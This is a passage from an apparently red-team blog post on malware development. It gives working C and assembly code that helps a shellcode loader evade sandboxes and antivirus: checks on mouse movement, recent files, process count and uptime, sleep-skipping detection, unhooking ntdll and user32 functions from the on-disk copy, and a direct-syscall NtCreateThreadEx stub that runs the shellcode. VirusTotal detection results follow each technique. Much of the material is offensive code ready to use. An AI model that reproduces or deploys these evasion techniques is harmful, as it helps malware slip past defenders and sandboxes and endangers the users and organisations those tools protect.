	<span class="n">mouseDistance</span> <span class="o">+=</span> <span class="n">sqrt</span><span class="p">(</span>
		<span class="n">pow</span><span class="p">(</span><span class="n">currentMousePosition</span><span class="p">.</span><span class="n">x</span> <span class="o">-</span> <span class="n">previousMousePosition</span><span class="p">.</span><span class="n">x</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span>
		<span class="n">pow</span><span class="p">(</span><span class="n">currentMousePosition</span><span class="p">.</span><span class="n">y</span> <span class="o">-</span> <span class="n">previousMousePosition</span><span class="p">.</span><span class="n">y</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
	<span class="p">);</span>
	<span class="n">Sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
	<span class="n">previousMousePosition</span> <span class="o">=</span> <span class="n">currentMousePosition</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">mouseDistance</span> <span class="o">&gt;</span> <span class="mi">20000</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Malicious intents were detected only by MS Defender (“Meterpreter”). No IP IoCs were extracted by VT sandbox:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_mouse_check.png" alt="VT mouse check"></p>

<h3 id="previous-user-interaction">Previous user interaction</h3>
<p>Sandboxes will probably lack specific indicators of previous user 
interaction with the system, for example the list of recently accessed 
documents may be empty or contain a low number of entries. We can browse
 the <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Windows\Recent</code> folder and count items inside:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PWSTR</span> <span class="n">recentFolder</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">SHGetKnownFolderPath</span><span class="p">(</span><span class="n">FOLDERID_Recent</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recentFolder</span><span class="p">);</span>
<span class="kt">wchar_t</span> <span class="n">recentFolderFiles</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">L""</span><span class="p">;</span>
<span class="n">StringCbCatW</span><span class="p">(</span><span class="n">recentFolderFiles</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">recentFolder</span><span class="p">);</span>
<span class="n">StringCbCatW</span><span class="p">(</span><span class="n">recentFolderFiles</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">*"</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">numberOfRecentFiles</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">WIN32_FIND_DATAW</span> <span class="n">findFileData</span><span class="p">;</span>
<span class="n">HANDLE</span> <span class="n">hFind</span> <span class="o">=</span> <span class="n">FindFirstFileW</span><span class="p">(</span><span class="n">recentFolderFiles</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">findFileData</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">hFind</span> <span class="o">!=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">do</span>
	<span class="p">{</span>
		<span class="n">numberOfRecentFiles</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">FindNextFileW</span><span class="p">(</span><span class="n">hFind</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">findFileData</span><span class="p">));</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="n">numberOfRecentFiles</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span> <span class="n">numberOfRecentFiles</span><span class="o">-=</span><span class="mi">2</span><span class="p">;</span> <span class="c1">//exclude '.' and '..'</span>
<span class="k">if</span> <span class="p">(</span><span class="n">numberOfRecentFiles</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>This is effective - only 1 AV flagged the binary (as suspicious), no IP IoCs extracted:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_recent_check.png" alt="VT recent check"></p>

<h3 id="number-of-running-processes">Number of running processes</h3>
<p>As sandbox environments have limited resources they may limit the 
number of processes running to the minimum. We can assume that a typical
 user has at least 50 processes running at any moment. Let’s enumerate 
running processes:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">runningProcessesIDs</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
<span class="n">DWORD</span> <span class="n">runningProcessesCountBytes</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">runningProcessesCount</span><span class="p">;</span>
<span class="n">EnumProcesses</span><span class="p">(</span><span class="n">runningProcessesIDs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">runningProcessesIDs</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">runningProcessesCountBytes</span><span class="p">);</span>
<span class="n">runningProcessesCount</span> <span class="o">=</span> <span class="n">runningProcessesCountBytes</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">runningProcessesCount</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>VirusTotal was unable to extract IP IoCs from this binary:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_processes_check.png" alt="VT processes check"></p>

<h3 id="uptime">Uptime</h3>
<p>System uptime may have a low value in a sandbox, especially when the 
virtual environment is spinned up each time a file is analyzed. We use 
64-bit function as regular <code class="language-plaintext highlighter-rouge">GetTickCount</code> overflows after 2^32 milliseconds (49,7 days):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="n">uptime</span> <span class="o">=</span> <span class="n">GetTickCount64</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">uptime</span> <span class="o">&lt;</span> <span class="mi">1200</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span> <span class="c1">//20 minutes</span>
</code></pre></div></div>

<p>Again, detected by MS Defender and marked as unsafe by Cylance. No IP IoCs were extracted by VT sandbox:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_uptime_check.png" alt="VT uptime check"></p>

<h3 id="delaying-execution">Delaying execution</h3>
<p>Delaying execution may evade sandbox analysis by exceeding the time limit for the sample execution. However it’s not as easy as <code class="language-plaintext highlighter-rouge">Sleep(1000000)</code>. Sandboxes may fast-forward our “naps”.</p>

<p>What we can do is to check system uptime before and after Sleeping. 
We can also use lower-level userland API for sleeping (there is a 
slightly less chance that it is hooked by AV). This requires obtaining 
function address dynamically - it will be broader used during API calls 
obfuscation described in one of the next articles. Also, <code class="language-plaintext highlighter-rouge">NtDelayExecution</code> function requires the sleep time parameter in a different format than <code class="language-plaintext highlighter-rouge">Sleep</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="n">uptimeBeforeSleep</span> <span class="o">=</span> <span class="n">GetTickCount64</span><span class="p">();</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PNtDelayExecution</span><span class="p">)(</span><span class="n">IN</span> <span class="n">BOOLEAN</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PLARGE_INTEGER</span><span class="p">);</span>
<span class="n">PNtDelayExecution</span> <span class="n">pNtDelayExecution</span> <span class="o">=</span> <span class="p">(</span><span class="n">PNtDelayExecution</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="s">L"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtDelayExecution"</span><span class="p">);</span>
<span class="n">LARGE_INTEGER</span> <span class="n">delay</span><span class="p">;</span>
<span class="n">delay</span><span class="p">.</span><span class="n">QuadPart</span> <span class="o">=</span> <span class="o">-</span><span class="mi">10000</span> <span class="o">*</span> <span class="mi">100000</span><span class="p">;</span> <span class="c1">// 100 seconds</span>
<span class="n">pNtDelayExecution</span><span class="p">(</span><span class="n">FALSE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">delay</span><span class="p">);</span>
<span class="n">ULONGLONG</span> <span class="n">uptimeAfterSleep</span> <span class="o">=</span> <span class="n">GetTickCount64</span><span class="p">();</span>
<span class="k">if</span> <span class="p">((</span><span class="n">uptimeAfterSleep</span> <span class="o">-</span> <span class="n">uptimeBeforeSleep</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>Analysis results: Unsafe ® by Cylance, no IP IoCs by VT sandbox:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_delay_check.png" alt="VT delay check"></p>

<h4 id="kernel-user-shared-data">Kernel-user shared data</h4>

<p>Some sophisticated sandbox may hook both <code class="language-plaintext highlighter-rouge">Sleep</code> function (or even kernel mode <code class="language-plaintext highlighter-rouge">ZwDelayExecution</code>; however I think that kernel hooks require hypervisor-level access nowadays) and <code class="language-plaintext highlighter-rouge">GetTickCount64</code> (or kernel mode <code class="language-plaintext highlighter-rouge">KeQueryTickCount</code>) . We can use the <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kuser_shared_data/index.htm"><code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA</code></a>
 structure which is shared by the system kernel with user-mode (in 
read-only mode of course) and contains information about the “tick 
count”. This structure It is always located at the same address in the 
memory (<code class="language-plaintext highlighter-rouge">0x7ffe0000</code>). Actual system uptime (<code class="language-plaintext highlighter-rouge">KSYSTEM_TIME</code>
 structure) is stored at the offset 0x320. We can just read it from the 
system’s memory and use to check if tickcount-related functions were 
manipulated by the sandbox:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Sleep</span><span class="p">(</span><span class="mi">1000000</span><span class="p">);</span>
<span class="n">ULONG</span> <span class="o">*</span><span class="n">PUserSharedData_TickCountMultiplier</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="mh">0x7ffe0004</span><span class="p">;</span>
<span class="n">LONG</span> <span class="o">*</span><span class="n">PUserSharedData_High1Time</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLONG</span><span class="p">)</span><span class="mh">0x7ffe0324</span><span class="p">;</span>
<span class="n">ULONG</span> <span class="o">*</span><span class="n">PUserSharedData_LowPart</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="mh">0x7ffe0320</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">time</span> <span class="o">=</span> <span class="n">GetTickCount64</span><span class="p">();</span>
<span class="n">DWORD</span> <span class="n">kernelTime</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">PUserSharedData_TickCountMultiplier</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">PUserSharedData_High1Time</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span>
	<span class="p">((</span><span class="o">*</span><span class="n">PUserSharedData_LowPart</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)(</span><span class="o">*</span><span class="n">PUserSharedData_TickCountMultiplier</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">);</span>
<span class="k">if</span> <span class="p">((</span><span class="n">time</span> <span class="o">-</span> <span class="n">kernelTime</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">kernelTime</span> <span class="o">-</span> <span class="n">time</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="function-hooking">Function hooking</h3>
<p>AVs/EDRs/Sandboxes can hook specific functions (ones often used for malicious purposes, like <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code> for code injection or <code class="language-plaintext highlighter-rouge">NtReadVirtualMemory</code> for memory reading - especially in case of <code class="language-plaintext highlighter-rouge">lsass.exe</code>
 dumping for credentials extraction). When a function is hooked, its 
first instructions are usually overwritten with a jump to another 
function in an external library, which can make some checks to discover 
malicious activity and decide to block further execution. Let’s see how 
to detect and fix function hooks.</p>

<h4 id="checking-and-unhooking-functions">Checking and unhooking functions</h4>

<p>We could check function assembly bytes and see if there’s any sign of hooking (like <code class="language-plaintext highlighter-rouge">call</code> instruction or a combination of <code class="language-plaintext highlighter-rouge">push</code> and <code class="language-plaintext highlighter-rouge">ret</code> instructions). However there’s a better approach: we can compare the function instructions loaded in the memory with <code class="language-plaintext highlighter-rouge">.dll</code> contents on the disk. Let’s see how to do it for <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code> function from <code class="language-plaintext highlighter-rouge">ntdll.dll</code>.
 We open the library file from disk and map it into memory. Then we 
browse its headers to find relative location of the export directory. 
Next we loop through function names stored in <code class="language-plaintext highlighter-rouge">AddressOfNames</code> array and look for “NtCreateThreadEx” name <a href="https://resources.infosecinstitute.com/the-export-directory/">(to find actual function code location we need to browse through the <code class="language-plaintext highlighter-rouge">AddressOfNameOrdinals</code> array)</a>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// manually load the dll</span>
<span class="n">HANDLE</span> <span class="n">dllFile</span> <span class="o">=</span> <span class="n">CreateFileW</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">ntdll.dll"</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">dllFileSize</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">dllFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">HANDLE</span> <span class="n">hDllFileMapping</span> <span class="o">=</span> <span class="n">CreateFileMappingW</span><span class="p">(</span><span class="n">dllFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_READONLY</span> <span class="o">|</span> <span class="n">SEC_IMAGE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">HANDLE</span> <span class="n">pDllFileMappingBase</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hDllFileMapping</span><span class="p">,</span> <span class="n">FILE_MAP_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">CloseHandle</span><span class="p">(</span><span class="n">dllFile</span><span class="p">);</span>

<span class="c1">// analyze the dll</span>
<span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pDosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">pDllFileMappingBase</span><span class="p">;</span>
<span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pNtHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pDllFileMappingBase</span> <span class="o">+</span> <span class="n">pDosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
<span class="n">PIMAGE_OPTIONAL_HEADER</span> <span class="n">pOptionalHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_OPTIONAL_HEADER</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">pNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">);</span>
<span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pDllFileMappingBase</span> <span class="o">+</span> <span class="n">pOptionalHeader</span><span class="o">-&gt;</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
<span class="n">PULONG</span> <span class="n">pAddressOfFunctions</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pDllFileMappingBase</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
<span class="n">PULONG</span> <span class="n">pAddressOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pDllFileMappingBase</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
<span class="n">PUSHORT</span> <span class="n">pAddressOfNameOrdinals</span> <span class="o">=</span> <span class="p">(</span><span class="n">PUSHORT</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pDllFileMappingBase</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>

<span class="c1">// find the original function code</span>
<span class="n">PVOID</span> <span class="n">pNtCreateThreadExOriginal</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">PCSTR</span> <span class="n">pFunctionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pDllFileMappingBase</span> <span class="o">+</span> <span class="n">pAddressOfNames</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pFunctionName</span><span class="p">,</span> <span class="s">"NtCreateThreadEx"</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">pNtCreateThreadExOriginal</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pDllFileMappingBase</span> <span class="o">+</span> <span class="n">pAddressOfFunctions</span><span class="p">[</span><span class="n">pAddressOfNameOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="c1">// compare functions</span>
<span class="n">PVOID</span> <span class="n">pNtCreateThreadEx</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="s">L"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtCreateThreadEx"</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">pNtCreateThreadEx</span><span class="p">,</span> <span class="n">pNtCreateThreadExOriginal</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>Ok, now let’s simulate the case when <code class="language-plaintext highlighter-rouge">MessageBoxW</code> is hooked in a way that  it immediately returns (with <code class="language-plaintext highlighter-rouge">C3</code> opcode - <code class="language-plaintext highlighter-rouge">RET</code>
 function). We want to detect the hook and patch the function with 
original assembly code from the dll located on the disk. This is useful 
when we want to execute some “blacklisted” functions (or a function with
 specific parameters that are forbiddensa).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// function hooking - usually done by AV/EDR/Sandbox</span>
<span class="c1">// this assumes that user32.dll is loaded into the process' address space</span>
<span class="n">PVOID</span> <span class="n">pMessageBoxW</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="s">L"user32.dll"</span><span class="p">),</span> <span class="s">"MessageBoxW"</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">oldProtect</span><span class="p">;</span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pMessageBoxW</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">hook</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xC3</span> <span class="p">};</span> <span class="c1">// ret</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">pMessageBoxW</span><span class="p">,</span> <span class="n">hook</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pMessageBoxW</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">oldProtect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>

<span class="n">MessageBoxW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">L"Hooked"</span><span class="p">,</span> <span class="s">L"Hooked"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// won't show up</span>

<span class="c1">// detect and fix the hook</span>
<span class="n">PVOID</span> <span class="n">pMessageBoxWOriginal</span> <span class="o">=</span> <span class="n">LoadDllFromDiskAndFindFunctionCode</span><span class="p">();</span> <span class="c1">// see the previous code snippet</span>
<span class="n">PVOID</span> <span class="n">pMessageBoxWHooked</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="s">L"user32.dll"</span><span class="p">),</span> <span class="s">"MessageBoxW"</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">pMessageBoxWHooked</span><span class="p">,</span> <span class="n">pMessageBoxWOriginal</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
<span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">oldProtection</span><span class="p">,</span> <span class="n">tempProtection</span><span class="p">;</span>
	<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pMessageBoxW</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtection</span><span class="p">);</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">pMessageBoxWHooked</span><span class="p">,</span> <span class="n">pMessageBoxWOriginal</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
	<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pMessageBoxW</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">oldProtection</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempProtection</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">MessageBoxW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">L"Fixed"</span><span class="p">,</span> <span class="s">L"Fixed"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="direct-syscalls">Direct syscalls</h4>

<p>Another thing we can do to bypass user-mode API hooks is to invoke 
direct system calls. Let’s first analyze our simple malware with Process
 Monitor.</p>

<p>Recap: the executable injects shellcode and creates new thread to run it:</p>

<p><code class="language-plaintext highlighter-rouge">HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &amp;threadID);</code></p>

<p>Thread creation event is captured:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/procmon_syscall.png" alt="procmon syscall"></p>

<p>We see that <code class="language-plaintext highlighter-rouge">CreateThread</code> function called from the code results in a call to <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code>. Then execution switches to kernel mode (ring 0) using a <code class="language-plaintext highlighter-rouge">syscall</code> CPU instruction with <a href="https://j00ru.vexillium.org/syscalls/nt/64/">syscall ID</a> stored in the <code class="language-plaintext highlighter-rouge">EAX</code> register.</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/disasm_syscall.png" alt="disasm syscall"></p>

<p>If the <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code> function is hooked, we may not be able to reach the syscall when calling this function, or other higher-level functions like <code class="language-plaintext highlighter-rouge">CreateThread</code>
 etc. We can however bypass the hook by generating the syscall directly 
from our code - all we need to do is to push all function parameters to 
the stack (this can be done in C) and issue the syscall (with assembly).</p>

<p>First we need to define the <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code> in assembly and add <code class="language-plaintext highlighter-rouge">.asm</code>
 file to the project. Also make sure that Microsoft Macro Assembler 
files are included in “Build Customizations” options of the project.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">.code</span>
	<span class="nf">NtCreateThreadEx</span> <span class="nv">PROC</span>
		<span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nb">rcx</span>
		<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">00bdh</span>
		<span class="nf">syscall</span>
		<span class="nf">ret</span>
	<span class="nf">NtCreateThreadEx</span> <span class="nv">ENDP</span>
<span class="nf">end</span>
</code></pre></div></div>

<p>Then declare external method in the source code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">EXTERN_C</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="n">NtCreateThreadEx</span><span class="p">)</span>
<span class="p">(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">AttributeList</span>
<span class="p">);</span>
</code></pre></div></div>

<p>Last thing to do is to call the function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">GetCurrentProcess</span><span class="p">();</span>
<span class="n">NtCreateThreadEx</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
